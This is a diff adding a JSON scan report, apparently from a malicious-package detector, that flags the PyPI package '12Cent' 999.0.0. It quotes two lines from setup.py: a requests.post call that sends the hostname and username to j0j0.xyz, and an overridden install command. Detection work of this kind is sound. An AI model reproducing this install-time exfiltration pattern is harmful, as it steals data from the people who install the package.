@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:40",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/', data=ploads, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:43",
+                "code": "setup(name='12Cent',\n      version='999.0.0',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": [
+            {
+                "location": "setup.py:40",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/', data=ploads, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/12Cent-999.0.0"
+}
